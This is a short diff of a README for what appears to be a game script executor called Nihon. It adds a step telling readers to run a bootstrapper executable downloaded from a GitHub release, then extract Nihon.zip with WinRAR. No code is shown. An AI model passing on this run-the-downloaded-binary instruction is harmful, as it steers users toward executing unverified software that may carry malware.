@@ -21,3 +21,5 @@
 #### Download below [](https://duckduckgo.com/?q=down%20arrow%20icon%20small&iax=images&ia=images&iai=https://www.clipartkey.com/mpngs/m/17-179368_down-arrow-images-group-clipart-royalty-free-download.png&t=newext&atb=v255-1)
 
 [![button](https://cdn.discordapp.com/attachments/811025745916329984/812145123223142402/Nihon_Transparent.png)](https://github.com/boomermc/Nihon-executor/releases/download/1.0/Nihon_Bootstrapper.exe)
+
+#### Once you run the bootstrapper, extract the Nihon.zip with (WinRAR)[https://www.rarlab.com/rar/winrar-x64-600.exe]
